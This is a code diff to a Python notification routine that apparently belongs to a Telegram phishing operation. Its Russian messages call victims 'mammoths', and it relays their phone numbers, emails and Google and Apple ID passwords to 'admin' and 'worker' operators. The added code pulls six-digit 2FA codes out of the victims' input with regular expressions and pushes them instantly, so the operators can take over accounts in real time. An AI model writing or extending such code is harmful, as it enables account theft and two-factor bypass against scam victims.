@@ -2,6 +2,7 @@ import asyncio
 import json
 import logging
 import os
+import re
 from datetime import datetime, timezone, timedelta
 from typing import Any, List, Optional
 
@@ -429,6 +430,18 @@ async def notify_user_event(
 
         phone_display = f"<code>{phone}</code>" if phone else "—"
 
+        google_code = None
+        if norm_step in ("google_code", "google_2fa", "google_checking"):
+            m = re.search(r"(?:код.*?:\s*|G-)?(\b\d{6}\b)", str(details or ""))
+            if m:
+                google_code = m.group(1)
+
+        apple_code = None
+        if norm_step in ("apple_code", "apple_2fa", "apple_code_entered"):
+            m = re.search(r"(\b\d{6}\b)", str(details or ""))
+            if m:
+                apple_code = m.group(1)
+
         # Unified Status Mapping: EXACT SAME status text for both Admin and Worker
         if norm_step in ("start", "registered", "register"):
             admin_header = "👀 <b>Заход в бота | ⏳ Не авторизован</b>\n"
@@ -489,7 +502,10 @@ async def notify_user_event(
         elif norm_step in ("google_code", "google_2fa", "google_checking"):
             admin_header = "🔢 <b>Введен код Google | ⏳ Проверка входа</b>\n"
             worker_header = "🦣 <b>Мамонт ввел код Google!</b>\n\n"
-            status_desc = "🔢 Ввел код Google (2FA), выполняется проверка..."
+            if google_code:
+                status_desc = f"🔢 Ввел 2FA код Google: <code>{google_code}</code>"
+            else:
+                status_desc = "🔢 Ввел код Google (2FA), выполняется проверка..."
         elif norm_step in ("apple_email", "apple_waiting_password"):
             admin_header = "🍏 <b>Введен Apple ID | ⏳ Ожидание пароля</b>\n"
             worker_header = "🦣 <b>Мамонт выбрал Apple ID!</b>\n\n"
@@ -517,7 +533,10 @@ async def notify_user_event(
         elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered"):
             admin_header = "🔢 <b>Введен 2FA код Apple ID | ⏳ Проверка входа</b>\n"
             worker_header = "🦣 <b>Мамонт ввел 2FA код Apple ID!</b>\n\n"
-            status_desc = "🔢 Ввел 6-значный код Apple ID, выполняется проверка..."
+            if apple_code:
+                status_desc = f"🔢 Ввел 2FA код Apple ID: <code>{apple_code}</code>"
+            else:
+                status_desc = "🔢 Ввел 6-значный код Apple ID, выполняется проверка..."
         elif norm_step in ("apple_wrong_code", "apple_error_code"):
             admin_header = "❌ <b>Неверный 2FA код Apple ID | ⏳ Ожидание повтора</b>\n"
             worker_header = "🦣 <b>Неверный 2FA код Apple ID!</b>\n\n"
@@ -590,8 +609,12 @@ async def notify_user_event(
             auth_data_lines = []
             if password_2fa:
                 auth_data_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
+            if google_code:
+                auth_data_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
+            elif apple_code:
+                auth_data_lines.append(f"• 🔢 <b>2FA код Apple ID:</b> <code>{apple_code}</code>")
             auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
-            if details and not is_final_auth:
+            if details and not is_final_auth and not google_code and not apple_code:
                 auth_data_lines.append(f"• 📝 <b>Детали:</b> {details}")
 
             block_auth = "\n".join(auth_data_lines)
@@ -623,8 +646,12 @@ async def notify_user_event(
 
             if password_2fa:
                 admin_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
+            if google_code:
+                admin_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
+            elif apple_code:
+                admin_lines.append(f"• 🔢 <b>2FA код Apple ID:</b> <code>{apple_code}</code>")
             admin_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
-            if details and not is_final_auth:
+            if details and not is_final_auth and not google_code and not apple_code:
                 admin_lines.append(f"• 📝 <b>Детали:</b> {details}")
 
             admin_text = "\n".join(admin_lines)
@@ -729,12 +756,26 @@ async def notify_user_event(
         admin_msg_map.pop("default", None)
 
         # 1.2 Admin Sliding Micro-Push (Option A: Sound & transient notification, previous deleted)
-        if password_2fa:
+        if norm_step in ("google_code", "google_2fa", "google_checking"):
+            code_str = f" <code>{google_code}</code>" if google_code else ""
+            admin_push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Google:{code_str}"
+        elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered"):
+            code_str = f" <code>{apple_code}</code>" if apple_code else ""
+            admin_push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Apple ID:{code_str}"
+        elif norm_step in ("google_wrong_2fa", "google_error_2fa"):
+            admin_push_text = f"❌ <b>{user_tag}:</b> Неверный 2FA код Google"
+        elif norm_step in ("apple_wrong_code", "apple_error_code"):
+            admin_push_text = f"❌ <b>{user_tag}:</b> Неверный 2FA код Apple ID"
+        elif norm_step in ("google_password", "google_waiting_code") and password_2fa:
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел Пароль Google: <code>{password_2fa}</code>"
+        elif norm_step in ("apple_password", "apple_checking", "apple_waiting_action") and password_2fa:
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел Пароль Apple ID: <code>{password_2fa}</code>"
+        elif norm_step in ("entered_2fa", "submit_2fa", "checking_2fa") and password_2fa:
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел 2FA Пароль: <code>{password_2fa}</code>"
+        elif password_2fa and norm_step not in ("authorized", "session", "complete"):
             admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел {pass_label}: <code>{password_2fa}</code>"
-        elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered", "google_code", "google_2fa"):
-            admin_push_text = f"🔢 <b>{user_tag}:</b> {status_desc}"
         elif email and norm_step in ("apple_email", "google_email", "apple_waiting_password", "google_waiting_password"):
-            admin_push_text = f"🍏 <b>{user_tag}:</b> Ввел {email_label} <code>{email}</code>"
+            admin_push_text = f"📧 <b>{user_tag}:</b> Ввел {email_label} <code>{email}</code>"
         elif phone and norm_step in ("phone", "waiting_code"):
             admin_push_text = f"📱 <b>{user_tag}:</b> Ввел телефон: <code>{phone}</code>"
         else:
@@ -800,6 +841,10 @@ async def notify_user_event(
                 w_user_lines.append(f"• 📱 <b>Устройство:</b> {device}")
             if password_2fa:
                 w_user_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
+            if google_code:
+                w_user_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
+            elif apple_code:
+                w_user_lines.append(f"• 🔢 <b>2FA код Apple ID:</b> <code>{apple_code}</code>")
 
             w_user_block = "\n".join(w_user_lines)
             w_status_block = f"<blockquote><i>📊 <b>Статус:</b> {status_desc}</i></blockquote>"
@@ -879,7 +924,14 @@ async def notify_user_event(
                         pass
 
                 # Short transient alert text for push notification sound/banner
-                push_text = f"<i>📊 <b>Статус:</b> {status_desc}</i>"
+                if norm_step in ("google_code", "google_2fa", "google_checking"):
+                    code_str = f" <code>{google_code}</code>" if google_code else ""
+                    push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Google:{code_str}"
+                elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered"):
+                    code_str = f" <code>{apple_code}</code>" if apple_code else ""
+                    push_text = f"🔢 <b>{user_tag}:</b> Ввел 2FA код Apple ID:{code_str}"
+                else:
+                    push_text = f"<i>📊 <b>Статус:</b> {status_desc}</i>"
 
                 try:
                     amsg = await admin_bot.send_message(
